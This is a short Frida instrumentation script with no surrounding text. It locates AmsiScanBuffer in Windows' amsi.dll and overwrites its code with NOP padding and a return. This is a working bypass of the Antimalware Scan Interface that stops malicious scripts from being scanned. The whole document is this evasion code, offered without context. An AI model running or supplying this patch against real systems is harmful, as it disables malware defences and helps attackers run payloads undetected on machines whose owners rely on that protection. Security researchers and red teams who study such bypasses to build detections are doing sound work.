var AmsiScanBuffer = Module.getExportByName("amsi.dll", "AmsiScanBuffer");

Memory.patchCode(AmsiScanBuffer, Process.pageSize, function (code) 
  { 
    const cw = new X86Writer(code, {pc: AmsiScanBuffer});
    cw.putNopPadding(Process.pageSize); 
    cw.putRet();
    cw.flush(); 
  }
);